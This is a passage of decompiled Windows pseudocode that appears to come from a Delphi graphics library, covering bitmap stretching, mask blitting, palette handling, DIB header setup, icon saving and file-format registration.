  local_8 = param_1;
  local_1c = CreateCompatibleDC((HDC)0x0);
  local_20 = CreateCompatibleDC((HDC)0x0);
  uStack80 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack80;
  GetObjectA(local_8,0x18,local_38);
  if (param_3 != '\0') {
    local_14 = CreateBitmap(local_10,local_c,1,1,(void *)0x0);
    if (local_14 != (HBITMAP)0x0) {
      h = SelectObject(local_1c,local_8);
      h_00 = SelectObject(local_20,local_14);
      StretchBlt(local_20,0,0,local_10,local_c,local_1c,0,0,local_34,local_30,0xcc0020);
      if (h != (HGDIOBJ)0x0) {
        SelectObject(local_1c,h);
      }
      if (h_00 != (HGDIOBJ)0x0) {
        SelectObject(local_20,h_00);
      }
    }
    *in_FS_OFFSET = uStack80;
    uStack80 = 0x41b470;
    DeleteDC(local_1c);
    uStack80 = 0x41b479;
    DeleteDC(local_20);
    return;
  }
  local_18 = GetDC((HWND)0x0);
  if (local_18 == (HDC)0x0) {
    FUN_0041b274();
  }
  uVar1 = *in_FS_OFFSET;
  *in_FS_OFFSET = &stack0xffffffa4;
  local_14 = CreateCompatibleBitmap(local_18,local_10,local_c);
  if (local_14 == (HBITMAP)0x0) {
    FUN_0041b274();
  }
  *in_FS_OFFSET = uVar1;
  ReleaseDC((HWND)0x0,local_18);
  return;
}



int FUN_0041b48c(short param_1)

{
  if (((param_1 != 1) && (param_1 != 4)) && (param_1 != 8)) {
    return 0;
  }
  return 1 << ((byte)param_1 & 0x1f);
}



int FUN_0041b4ac(int param_1,int param_2,int param_3)

{
  uint uVar1;
  
  uVar1 = param_1 * param_2 + (param_3 - 1U) & ~(param_3 - 1U);
  if ((int)uVar1 < 0) {
    uVar1 = uVar1 + 7;
  }
  return (int)uVar1 >> 3;
}



void FUN_0041b4c0(HDC param_1,int param_2,int param_3,int param_4,int param_5,HDC param_6,
                 int param_7,int param_8,int param_9,int param_10,HDC param_11,int param_12,
                 int param_13)

{
  HBITMAP pHVar1;
  HGDIOBJ pvVar2;
  uint rop;
  HDC pHVar3;
  HGDIOBJ h;
  HPALETTE hPal;
  COLORREF color;
  COLORREF color_00;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar4;
  HPALETTE local_28;
  
  if (((*(int *)PTR_DAT_004415b0 == 2) && (param_8 == param_13)) && (param_7 == param_12)) {
    pHVar1 = CreateCompatibleBitmap(param_11,1,1);
    pvVar2 = (HGDIOBJ)FUN_0041b31c((int)pHVar1);
    pHVar1 = (HBITMAP)SelectObject(param_6,pvVar2);
    uVar4 = *in_FS_OFFSET;
    *in_FS_OFFSET = &stack0xffffffc0;
    rop = FUN_00406dd0(0xaa0029,0xcc0020);
    MaskBlt(param_1,param_2,param_3,param_13,param_12,param_11,param_10,param_9,pHVar1,param_5,
            param_4,rop);
    *in_FS_OFFSET = uVar4;
    pvVar2 = SelectObject(param_6,pHVar1);
    DeleteObject(pvVar2);
    return;
  }
  pHVar3 = CreateCompatibleDC((HDC)0x0);
  pHVar3 = (HDC)FUN_0041b31c((int)pHVar3);
  uVar4 = *in_FS_OFFSET;
  *in_FS_OFFSET = &stack0xffffffc0;
  pHVar1 = CreateCompatibleBitmap(param_11,param_8,param_7);
  pvVar2 = (HGDIOBJ)FUN_0041b31c((int)pHVar1);
  h = SelectObject(pHVar3,pvVar2);
  hPal = SelectPalette(param_11,DAT_00442890,0);
  SelectPalette(param_11,hPal,0);
  if (hPal == (HPALETTE)0x0) {
    local_28 = SelectPalette(pHVar3,DAT_00442890,-1);
  }
  else {
    local_28 = SelectPalette(pHVar3,hPal,-1);
  }
  RealizePalette(pHVar3);
  StretchBlt(pHVar3,0,0,param_8,param_7,param_6,param_5,param_4,param_8,param_7,0xcc0020);
  StretchBlt(pHVar3,0,0,param_8,param_7,param_11,param_10,param_9,param_8,param_7,
             (DWORD)&DAT_00440328);
  color = SetTextColor(param_1,0);
  color_00 = SetBkColor(param_1,0xffffff);
  StretchBlt(param_1,param_2,param_3,param_13,param_12,param_6,param_5,param_4,param_8,param_7,
             0x8800c6);
  StretchBlt(param_1,param_2,param_3,param_13,param_12,pHVar3,0,0,param_8,param_7,0x660046);
  SetTextColor(param_1,color);
  SetBkColor(param_1,color_00);
  if (h != (HGDIOBJ)0x0) {
    SelectObject(pHVar3,h);
  }
  DeleteObject(pvVar2);
  *in_FS_OFFSET = uVar4;
  if (local_28 != (HPALETTE)0x0) {
    SelectPalette(pHVar3,local_28,0);
  }
  DeleteDC(pHVar3);
  return;
}



void FUN_0041b754(int param_1)

{
  undefined *puVar1;
  undefined *puVar2;
  int iVar3;
  
  iVar3 = 0xff;
  do {
    puVar1 = (undefined *)(param_1 + iVar3 * 4);
    puVar2 = (undefined *)(param_1 + iVar3 * 3);
    puVar1[2] = puVar2[2];
    puVar1[1] = puVar2[1];
    *puVar1 = *puVar2;
    puVar1[3] = 0;
    iVar3 = iVar3 + -1;
  } while (iVar3 != 0);
  *(undefined *)(param_1 + 3) = 0;
  return;
}



void FUN_0041b78c(int param_1,int *param_2)

{
  undefined *puVar1;
  undefined *puVar2;
  int iVar3;
  int iVar4;
  
  iVar4 = *param_2 + -1;
  if (0 < iVar4) {
    iVar3 = 1;
    do {
      puVar1 = (undefined *)(param_1 + iVar3 * 4);
      puVar2 = (undefined *)(param_1 + iVar3 * 3);
      puVar2[2] = puVar1[2];
      puVar2[1] = puVar1[1];
      *puVar2 = *puVar1;
      iVar3 = iVar3 + 1;
      iVar4 = iVar4 + -1;
    } while (iVar4 != 0);
  }
  if (*param_2 < 0x100) {
    FUN_004030a0((undefined4 *)(param_1 + *param_2 * 3),(0x100 - *param_2) * 3,0);
    *param_2 = 0x100;
  }
  return;
}



void FUN_0041b804(int param_1,int param_2)

{
  uint uVar1;
  _SYSTEM_INFO local_30;
  int local_c;
  int local_8;
  
  local_c = param_2;
  local_8 = param_1;
  GetSystemInfo(&local_30);
  local_c = local_c + -1;
  if (-1 < local_c) {
    if (local_30.wProcessorLevel == 3) {
      do {
        uVar1 = *(uint *)(local_8 + local_c * 4);
        *(uint *)(local_8 + local_c * 4) =
             uVar1 >> 0x10 & 0xff | (uint)CONCAT11((char)uVar1,(char)(uVar1 >> 8)) << 8;
        local_c = local_c + -1;
      } while (-1 < local_c);
    }
    else {
      do {
        uVar1 = *(uint *)(local_8 + local_c * 4);
        *(uint *)(local_8 + local_c * 4) =
             ((uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18) >> 8;
        local_c = local_c + -1;
      } while (-1 < local_c);
    }
  }
  return;
}



void FUN_0041b85c(undefined4 *param_1)

{
  int iVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar2;
  tagPALETTEENTRY local_408 [7];
  tagPALETTEENTRY local_3ec;
  tagPALETTEENTRY local_3e8;
  tagPALETTEENTRY local_3e4 [247];
  HDC local_8;
  
  FUN_0040285c(param_1,local_408,0x40);
  local_8 = GetDC((HWND)0x0);
  uVar2 = *in_FS_OFFSET;
  *in_FS_OFFSET = &stack0xfffffbe4;
  iVar1 = GetDeviceCaps(local_8,0x68);
  if (0xf < iVar1) {
    GetSystemPaletteEntries(local_8,0,8,local_408);
    if (local_3ec == (tagPALETTEENTRY)0xc0c0c0) {
      GetSystemPaletteEntries(local_8,iVar1 - 8,1,&local_3ec);
      GetSystemPaletteEntries(local_8,iVar1 - 7,7,local_3e4);
      GetSystemPaletteEntries(local_8,7,1,&local_3e8);
    }
    else {
      GetSystemPaletteEntries(local_8,iVar1 - 8,8,&local_3e8);
    }
  }
  *in_FS_OFFSET = uVar2;
  ReleaseDC((HWND)0x0,local_8);
  return;
}



uint FUN_0041b974(uint param_1)

{
  HDC hdc;
  int iVar1;
  uint uVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar3;
  
  if (DAT_00442890 != (HPALETTE)0x0) {
    hdc = GetDC((HWND)0x0);
    uVar3 = *in_FS_OFFSET;
    *in_FS_OFFSET = &stack0xffffffe4;
    iVar1 = GetDeviceCaps(hdc,0x68);
    if (0xf < iVar1) {
      GetPaletteEntries(DAT_00442890,0,8,(LPPALETTEENTRY)(param_1 + 4));
      GetPaletteEntries(DAT_00442890,8,8,
                        (LPPALETTEENTRY)((param_1 - 0x1c) + (uint)*(ushort *)(param_1 + 2) * 4));
    }
    *in_FS_OFFSET = uVar3;
    uVar2 = ReleaseDC((HWND)0x0,hdc);
    return uVar2;
  }
  return param_1 & 0xffffff00;
}



HPALETTE FUN_0041ba0c(HGDIOBJ param_1,undefined4 *param_2,int param_3)

{
  HDC hdc;
  HGDIOBJ h;
  UINT UVar1;
  uint uVar2;
  HPALETTE pHVar3;
  LOGPALETTE local_410 [128];
  
  local_410[0].palVersion = 0x300;
  if (param_1 == (HGDIOBJ)0x0) {
    local_410[0].palNumEntries = (WORD)param_3;
    FUN_0040285c(param_2,local_410[0].palPalEntry,param_3 << 2);
  }
  else {
    hdc = CreateCompatibleDC((HDC)0x0);
    h = SelectObject(hdc,param_1);
    UVar1 = GetDIBColorTable(hdc,0,0x100,(RGBQUAD *)local_410[0].palPalEntry);
    local_410[0].palNumEntries = (WORD)UVar1;
    SelectObject(hdc,h);
    DeleteDC(hdc);
  }
  if (local_410[0].palNumEntries != 0) {
    if ((local_410[0].palNumEntries != 0x10) ||
       (uVar2 = FUN_0041b974((uint)local_410), (char)uVar2 == '\0')) {
      FUN_0041b804((int)local_410[0].palPalEntry,(uint)local_410[0].palNumEntries);
    }
    pHVar3 = CreatePalette(local_410);
    return pHVar3;
  }
  return (HPALETTE)0x0;
}



UINT FUN_0041bab0(HPALETTE param_1,LPPALETTEENTRY param_2,int param_3)

{
  int iVar1;
  UINT local_10;
  
  local_10 = 0;
  if (param_1 != (HPALETTE)0x0) {
    iVar1 = GetObjectA(param_1,4,&local_10);
    if ((iVar1 != 0) && (local_10 != 0)) {
      if ((int)(param_3 + 1U) < (int)local_10) {
        local_10 = param_3 + 1U;
      }
      GetPaletteEntries(param_1,0,local_10,param_2);
      FUN_0041b804((int)param_2,local_10);
    }
  }
  return local_10;
}



void FUN_0041bb04(BITMAPINFOHEADER *param_1,undefined4 *param_2,undefined4 param_3,int *param_4)

{
  int iVar1;
  HDC hdc;
  HBITMAP pHVar2;
  HANDLE ho;
  undefined4 uVar3;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar4;
  undefined4 uStack48;
  undefined *puStack44;
  
  param_1->biHeight = (uint)param_1->biHeight >> 1;
  iVar1 = FUN_0041b4ac(param_1->biWidth,(uint)param_1->biBitCount,0x20);
  param_1->biSizeImage = iVar1 * param_1->biHeight;
  iVar1 = FUN_0041b48c(param_1->biBitCount);
  puStack44 = (undefined *)0x41bb53;
  hdc = GetDC((HWND)0x0);
  if (hdc == (HDC)0x0) {
    FUN_0041b220();
  }
  puStack44 = &DAT_0041bcb0;
  uStack48 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack48;
  pHVar2 = CreateDIBitmap(hdc,param_1,4,&param_1[1].biSize + iVar1,(BITMAPINFO *)param_1,0);
  ho = (HANDLE)FUN_0041b31c((int)pHVar2);
  uVar4 = *in_FS_OFFSET;
  *in_FS_OFFSET = &stack0xffffffc4;
  uVar3 = FUN_0041b32c(ho,param_4,'\0');
  *param_2 = uVar3;
  *in_FS_OFFSET = uVar4;
  DeleteObject(ho);
  return;
}



int FUN_0041bcc0(int param_1)

{
  if (param_1 == 0) {
    param_1 = 0x7fffffff;
  }
  return param_1;
}



undefined4 FUN_0041bccc(byte *param_1,byte *param_2,undefined4 param_3,int param_4)

{
  uint uVar1;
  int iVar2;
  undefined4 uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  
  uVar4 = (uint)*param_2 - **(int **)(param_4 + 8);
  uVar5 = (uint)param_2[1] - *(int *)(*(int *)(param_4 + 8) + 4);
  uVar6 = (uint)*param_1 - **(int **)(param_4 + 8);
  uVar1 = (uint)param_1[1] - *(int *)(*(int *)(param_4 + 8) + 4);
  if ((((int)((uVar6 ^ (int)uVar6 >> 0x1f) - ((int)uVar6 >> 0x1f)) <
        (int)((uVar4 ^ (int)uVar4 >> 0x1f) - ((int)uVar4 >> 0x1f))) ||
      (((0 < (int)uVar4 && ((int)uVar6 < (int)uVar4)) ||
       (iVar2 = (uVar1 ^ (int)uVar1 >> 0x1f) - ((int)uVar1 >> 0x1f),
       iVar2 < (int)((uVar5 ^ (int)uVar5 >> 0x1f) - ((int)uVar5 >> 0x1f)))))) ||
     ((0 < (int)uVar5 && ((int)uVar1 < (int)uVar5)))) {
    uVar3 = 0;
  }
  else {
    uVar3 = CONCAT31((int3)((uint)iVar2 >> 8),1);
  }
  return uVar3;
}



void FUN_0041bd5c(int *param_1,undefined4 param_2,int param_3,uint *param_4,uint *param_5)

{
  undefined4 *puVar1;
  uint uVar2;
  HDC hdc;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar3;
  undefined4 uStack140;
  undefined *puStack136;
  undefined *puStack132;
  
  puStack132 = (undefined *)0x41bd82;
  puVar1 = FUN_00407db4(param_3 << 4);
  puStack136 = &LAB_0041c053;
  uStack140 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack140;
  puStack132 = &stack0xfffffffc;
  (**(code **)(*param_1 + 0xc))(param_1,puVar1,param_3 << 4);
  if ((*param_5 | param_5[1]) == 0) {
    uVar2 = GetSystemMetrics(0xb);
    *param_4 = uVar2;
    uVar2 = GetSystemMetrics(0xc);
    param_4[1] = uVar2;
  }
  else {
    *param_4 = *param_5;
    param_4[1] = param_5[1];
  }
  hdc = GetDC((HWND)0x0);
  if (hdc == (HDC)0x0) {
    FUN_0041b220();
  }
  uVar3 = *in_FS_OFFSET;
  *in_FS_OFFSET = &stack0xffffff68;
  GetDeviceCaps(hdc,0xe);
  GetDeviceCaps(hdc,0xc);
  *in_FS_OFFSET = uVar3;
  ReleaseDC((HWND)0x0,hdc);
  return;
}



ushort FUN_0041c064(ushort *param_1)

{
  ushort *puVar1;
  ushort uVar2;
  
  uVar2 = 0;
  puVar1 = param_1 + 10;
  for (; (int)param_1 < (int)puVar1; param_1 = param_1 + 1) {
    uVar2 = uVar2 ^ *param_1;
  }
  return uVar2;
}



void FUN_0041c07c(HANDLE param_1,uint *param_2,uint param_3)

{
  int iVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  undefined auStack96 [4];
  uint local_5c;
  uint local_58;
  short local_50;
  short local_4e;
  uint local_48 [15];
  
  local_48[0] = 0;
  iVar1 = GetObjectA(param_1,0x54,auStack96);
  if (iVar1 == 0) {
    FUN_0041b1fc();
  }
  else if ((iVar1 < 0x40) || (local_48[0] < 0x28)) {
    FUN_004030a0(param_2,0x28,0);
    *param_2 = 0x28;
    param_2[1] = local_5c;
    param_2[2] = local_58;
  }
  else {
    puVar3 = local_48;
    puVar4 = param_2;
    for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {
      *puVar4 = *puVar3;
      puVar3 = puVar3 + 1;
      puVar4 = puVar4 + 1;
    }
  }
  if (param_3 == 2) {
    *(undefined2 *)((int)param_2 + 0xe) = 1;
  }
  else if (param_3 - 3 < 0xe) {
    *(undefined2 *)((int)param_2 + 0xe) = 4;
    param_2[8] = param_3;
  }
  else if (param_3 - 0x11 < 0xf0) {
    *(undefined2 *)((int)param_2 + 0xe) = 8;
    param_2[8] = param_3;
  }
  else {
    *(short *)((int)param_2 + 0xe) = local_4e * local_50;
  }
  *(undefined2 *)(param_2 + 3) = 1;
  if (param_2[8] < param_2[9]) {
    param_2[9] = param_2[8];
  }
  if (param_2[5] == 0) {
    iVar1 = FUN_0041b4ac(param_2[1],(uint)*(ushort *)((int)param_2 + 0xe),0x20);
    uVar2 = (int)param_2[2] >> 0x1f;
    param_2[5] = iVar1 * ((param_2[2] ^ uVar2) - uVar2);
  }
  return;
}



void FUN_0041c160(HANDLE param_1,int *param_2,undefined4 *param_3,uint param_4)

{
  uint local_2c [3];
  ushort local_1e;
  byte local_1c;
  undefined4 local_18;
  int local_c;
  
  FUN_0041c07c(param_1,local_2c,param_4);
  if (local_1e < 9) {
    if (local_c == 0) {
      *param_2 = (1 << ((byte)local_1e & 0x1f)) * 4 + 0x28;
    }
    else {
      *param_2 = local_c * 4 + 0x28;
    }
  }
  else {
    *param_2 = 0x28;
    if ((local_1c & 3) != 0) {
      *param_2 = *param_2 + 0xc;
    }
  }
  *param_3 = local_18;
  return;
}



void FUN_0041c1c4(HBITMAP param_1,HPALETTE param_2,LPBITMAPINFO param_3,uint param_4,LPVOID param_5)

{
  HDC hdc;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar1;
  HPALETTE local_c;
  
  FUN_0041c07c(param_1,(uint *)param_3,param_4);
  local_c = (HPALETTE)0x0;
  hdc = CreateCompatibleDC((HDC)0x0);
  uVar1 = *in_FS_OFFSET;
  *in_FS_OFFSET = &stack0xffffffd8;
  if (param_2 != (HPALETTE)0x0) {
    local_c = SelectPalette(hdc,param_2,0);
    RealizePalette(hdc);
  }
  GetDIBits(hdc,param_1,0,(param_3->bmiHeader).biHeight,param_5,param_3,0);
  *in_FS_OFFSET = uVar1;
  if (local_c != (HPALETTE)0x0) {
    SelectPalette(hdc,local_c,0);
  }
  DeleteDC(hdc);
  return;
}



void FUN_0041c274(void)

{
  return;
}



void FUN_0041c278(int param_1)

{
  if (param_1 == 0) {
    FUN_0041c274();
  }
  return;
}



void FUN_0041c284(int *param_1,HICON param_2,char param_3)

{
  LONG *pLVar1;
  LPBITMAPINFO ptVar2;
  BOOL BVar3;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar4;
  undefined4 uStack124;
  undefined *puStack120;
  undefined4 uStack112;
  undefined local_58;
  undefined local_57;
  short local_56;
  int local_50;
  undefined4 local_4c;
  ICONINFO local_48;
  int local_34;
  undefined4 local_2e;
  undefined2 local_2a;
  undefined4 *local_28;
  LPBITMAPINFO local_24;
  undefined4 *local_20;
  LPBITMAPINFO local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  uint local_c;
  char local_5;
  
  local_5 = param_3;
  FUN_004030a0(&local_2e,6,0);
  FUN_004030a0((undefined4 *)&local_58,0x10,0);
  uStack112 = 0x41c2bc;
  BVar3 = GetIconInfo(param_2,&local_48);
  FUN_0041c278(BVar3);
  uStack112 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack112;
  puStack120 = (undefined *)0x41c2df;
  FUN_0041c160(local_48.hbmMask,(int *)&local_c,&local_14,2);
  puStack120 = (undefined *)0x41c2ef;
  FUN_0041c160(local_48.hbmColor,(int *)&local_10,&local_18,0x10);
  local_1c = (LPBITMAPINFO)0x0;
  local_20 = (undefined4 *)0x0;
  local_24 = (LPBITMAPINFO)0x0;
  local_28 = (undefined4 *)0x0;
  puStack120 = &LAB_0041c44b;
  uStack124 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack124;
  local_1c = (LPBITMAPINFO)FUN_00407db4(local_c);
  local_20 = FUN_00407db4(local_14);
  local_24 = (LPBITMAPINFO)FUN_00407db4(local_10);
  local_28 = FUN_00407db4(local_18);
  FUN_0041c1c4(local_48.hbmMask,(HPALETTE)0x0,local_1c,2,local_20);
  uVar4 = 0x10;
  FUN_0041c1c4(local_48.hbmColor,(HPALETTE)0x0,local_24,0x10,local_28);
  if (local_5 != '\0') {
    local_34 = local_10 + 0x16 + local_18 + local_14;
    (**(code **)(*param_1 + 0x10))(param_1,&local_34,4);
  }
  local_2e._2_2_ = 1;
  local_2a = 1;
  (**(code **)(*param_1 + 0x10))(param_1,&local_2e,6);
  ptVar2 = local_24;
  local_58 = *(undefined *)&(local_24->bmiHeader).biWidth;
  local_57 = *(undefined *)&(local_24->bmiHeader).biHeight;
  local_56 = (local_24->bmiHeader).biPlanes * (local_24->bmiHeader).biBitCount;
  local_50 = local_10 + local_18 + local_14;
  local_4c = 0x16;
  (**(code **)(*param_1 + 0x10))(param_1,&local_58,0x10);
  pLVar1 = &(ptVar2->bmiHeader).biHeight;
  *pLVar1 = *pLVar1 + (ptVar2->bmiHeader).biHeight;
  (**(code **)(*param_1 + 0x10))(param_1,local_24,local_10);
  (**(code **)(*param_1 + 0x10))(param_1,local_28,local_18);
  (**(code **)(*param_1 + 0x10))(param_1,local_20,local_14);
  *in_FS_OFFSET = uVar4;
  FUN_004026c8((int)local_24);
  FUN_004026c8((int)local_28);
  FUN_004026c8((int)local_1c);
  FUN_004026c8((int)local_20);
  return;
}



int * FUN_0041c480(int *param_1,char param_2,undefined4 param_3)

{
  undefined4 extraout_ECX;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  undefined4 in_stack_fffffff4;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe8,in_stack_ffffffec,
                                  in_stack_fffffff0,in_stack_fffffff4);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_00403af4(param_1,'\0',param_3);
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffe8;
  }
  return param_1;
}



void FUN_0041c4b8(int param_1)

{
  *(undefined *)(param_1 + 0x20) = 1;
  if (*(short *)(param_1 + 0x12) != 0) {
    (**(code **)(param_1 + 0x10))(*(undefined4 *)(param_1 + 0x14),param_1);
  }
  return;
}



uint FUN_0041c4d0(undefined param_1,undefined param_2,undefined param_3,int param_4)

{
  int *piVar1;
  undefined4 uVar2;
  uint uVar3;
  
  if (*(int *)(*(int *)(param_4 + -4) + 0x20) == 0) {
    uVar3 = (**(code **)(**(int **)(param_4 + -8) + 0x1c))();
    return uVar3 ^ 1;
  }
  piVar1 = *(int **)(*(int *)(param_4 + -4) + 0x20);
  uVar2 = FUN_00403cb0(piVar1,(int)&PTR_LAB_00411ec5_3_004191f0);
  if (((char)uVar2 != '\0') &&
     (uVar2 = (**(code **)(**(int **)(param_4 + -8) + 0x18))(*(int **)(param_4 + -8),piVar1),
     (char)uVar2 != '\0')) {
    return 0;
  }
  return CONCAT31((int3)((uint)uVar2 >> 8),1);
}



void FUN_0041c528(int *param_1,int *param_2)

{
  uint uVar1;
  undefined in_CL;
  undefined4 uVar2;
  undefined4 uVar3;
  int *piVar4;
  
  uVar3 = *(undefined4 *)(*param_1 + 0x30);
  uVar2 = *(undefined4 *)(*param_1 + 0x44);
  piVar4 = param_1;
  uVar1 = FUN_0041c4d0((char)uVar2,(char)param_2,in_CL,&stack0xfffffffc);
  (**(code **)(*param_2 + 8))(param_2,&DAT_0041c56c,uVar1,uVar2,param_1,uVar3,piVar4);
  return;
}



uint FUN_0041c574(int *param_1,int *param_2)

{
  char cVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  undefined4 uVar5;
  undefined4 *puVar6;
  int *piVar7;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  int extraout_EDX;
  int extraout_EDX_00;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack52;
  undefined *puStack48;
  undefined *puStack44;
  undefined4 uStack40;
  undefined *puStack36;
  undefined *puStack32;
  byte local_5;
  
  if (param_2 == (int *)0x0) {
LAB_0041c599:
    local_5 = 0;
  }
  else {
    puStack32 = (undefined *)0x41c58c;
    iVar2 = FUN_00403a94(param_1);
    puStack32 = (undefined *)0x41c595;
    iVar3 = FUN_00403a94(param_2);
    if (iVar2 != iVar3) goto LAB_0041c599;
    local_5 = 1;
  }
  puStack32 = (undefined *)0x41c5a9;
  cVar1 = (**(code **)(*param_1 + 0x1c))();
  if (cVar1 == '\0') {
    puStack32 = (undefined *)0x41c5b4;
    uVar4 = (**(code **)(*param_2 + 0x1c))();
    if ((char)uVar4 == '\0') {
      if (local_5 != 0) {
        puStack32 = (undefined *)0x41c5f2;
        puVar6 = (undefined4 *)FUN_00403af4((int *)&PTR_LAB_00411360,'\x01',extraout_ECX);
        puStack36 = &LAB_0041c6ab;
        uStack40 = *in_FS_OFFSET;
        *in_FS_OFFSET = &uStack40;
        puStack44 = (undefined *)0x41c60d;
        puStack32 = &stack0xfffffffc;
        (**(code **)(*param_1 + 0x44))(param_1,puVar6);
        puStack44 = (undefined *)0x41c619;
        piVar7 = (int *)FUN_00403af4((int *)&PTR_LAB_00411360,'\x01',extraout_ECX_00);
        puStack48 = &LAB_0041c68e;
        uStack52 = *in_FS_OFFSET;
        *in_FS_OFFSET = &uStack52;
        puStack44 = &stack0xfffffffc;
        (**(code **)(*param_2 + 0x44))(param_2,piVar7);
        iVar2 = (**(code **)*puVar6)();
        iVar3 = (**(code **)*piVar7)();
        if (extraout_EDX_00 == extraout_EDX && iVar3 == iVar2) {
          uVar4 = (**(code **)*puVar6)();
          FUN_00407e4c((int *)puVar6[1],(int *)piVar7[1],uVar4);
        }
        *in_FS_OFFSET = uStack52;
        puStack44 = &LAB_0041c695;
        puStack48 = (undefined *)0x41c68d;
        uVar4 = FUN_00403b24(piVar7);
        return uVar4;
      }
      goto LAB_0041c6b2;
    }
  }
  puStack32 = (undefined *)0x41c5bf;
  cVar1 = (**(code **)(*param_1 + 0x1c))();
  if (cVar1 == '\0') {
LAB_0041c5ce:
    uVar4 = 0;
  }
  else {
    puStack32 = (undefined *)0x41c5ca;
    uVar5 = (**(code **)(*param_2 + 0x1c))();
    if ((char)uVar5 == '\0') goto LAB_0041c5ce;
    uVar4 = CONCAT31((int3)((uint)uVar5 >> 8),1);
  }
  local_5 = (byte)uVar4;
LAB_0041c6b2:
  return uVar4 & 0xffffff00 | (uint)local_5;
}



void FUN_0041c718(int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                 undefined4 param_5,byte param_6,byte param_7)

{
  uint unaff_EBX;
  
  if (*(short *)(param_1 + 0x1a) != 0) {
    (**(code **)(param_1 + 0x18))
              (*(undefined4 *)(param_1 + 0x1c),param_2,param_3,param_4,param_5,
               unaff_EBX & 0xffffff00 | (uint)param_6,unaff_EBX & 0xffffff00 | (uint)param_7);
  }
  return;
}



void FUN_0041c74c(int *param_1,undefined *param_2)

{
  int *piVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStackY24;
  undefined *puStackY20;
  
  puStackY20 = (undefined *)0x41c766;
  piVar1 = FUN_0041382c((int *)&PTR_LAB_00411270,'\x01',param_2,0xffff);
  puStackY20 = &DAT_0041c797;
  uStackY24 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStackY24;
  (**(code **)(*param_1 + 0x58))(param_1,piVar1);
  *in_FS_OFFSET = uStackY24;
  puStackY20 = (undefined *)0x41c796;
  FUN_00403b24(piVar1);
  return;
}



void FUN_0041c860(int *param_1,char param_2)

{
  undefined4 uVar1;
  undefined4 extraout_ECX;
  undefined4 *in_FS_OFFSET;
  undefined *puVar2;
  undefined **ppuVar3;
  undefined4 uStack56;
  undefined *puStack52;
  undefined *puStack48;
  undefined4 in_stack_ffffffd4;
  undefined4 in_stack_ffffffd8;
  undefined4 in_stack_ffffffdc;
  undefined4 in_stack_ffffffe0;
  undefined4 *local_14;
  undefined4 *local_10;
  undefined4 *local_c;
  undefined4 *local_8;
  
  uVar1 = 0;
  local_8 = (undefined4 *)0x0;
  local_c = (undefined4 *)0x0;
  local_10 = (undefined4 *)0x0;
  local_14 = (undefined4 *)0x0;
  if (param_2 != '\0') {
    puStack48 = (undefined *)0x41c877;
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,0,in_stack_ffffffd4,in_stack_ffffffd8,
                                  in_stack_ffffffdc,in_stack_ffffffe0);
    uVar1 = extraout_ECX;
  }
  puStack52 = &LAB_0041c93d;
  uStack56 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack56;
  puStack48 = &stack0xfffffffc;
  FUN_00403af4(param_1,'\0',uVar1);
  uVar1 = 0;
  ppuVar3 = &PTR_LAB_00411ec5_3_004194b0;
  FUN_0040658c((int **)PTR_PTR_DAT_004414a0,(int *)&local_8);
  FUN_0041c9e0(param_1,&DAT_0041c96c,local_8,ppuVar3,uVar1);
  uVar1 = 0;
  ppuVar3 = &PTR_LAB_00411ec5_3_004194b0;
  FUN_0040658c((int **)PTR_PTR_DAT_004413c8,(int *)&local_c);
  FUN_0041c9e0(param_1,&DAT_0041c978,local_c,ppuVar3,uVar1);
  uVar1 = 0;
  ppuVar3 = &PTR_LAB_00411ec5_3_00419734;
  FUN_0040658c((int **)PTR_PTR_DAT_004413c4,(int *)&local_10);
  FUN_0041c9e0(param_1,&DAT_0041c984,local_10,ppuVar3,uVar1);
  uVar1 = 0;
  puVar2 = &LAB_004195f0;
  FUN_0040658c((int **)PTR_PTR_DAT_004413c0,(int *)&local_14);
  FUN_0041c9e0(param_1,&LAB_0041c990,local_14,puVar2,uVar1);
  *in_FS_OFFSET = puVar2;
  FUN_004047cc((int *)&local_14,4);
  return;
}



void FUN_0041c9e0(int *param_1,undefined *param_2,undefined4 *param_3,undefined4 param_4,
                 undefined4 param_5)

{
  undefined4 *puVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack40;
  undefined *puStack36;
  undefined *puStack32;
  undefined4 *local_10;
  undefined4 *local_c;
  undefined *local_8;
  
  puStack32 = &stack0xfffffffc;
  local_10 = (undefined4 *)0x0;
  puStack36 = &LAB_0041ca63;
  uStack40 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack40;
  local_c = param_3;
  local_8 = param_2;
  puVar1 = FUN_00405644(0x10,"\x0e\vTFileFormat\x10");
  FUN_00407ee4(local_8,(LPSTR *)&local_10);
  FUN_004047fc(puVar1 + 1,local_10);
  *puVar1 = param_4;
  FUN_004047fc(puVar1 + 2,local_c);
  puVar1[3] = param_5;
  FUN_00411968(param_1,(int)puVar1);
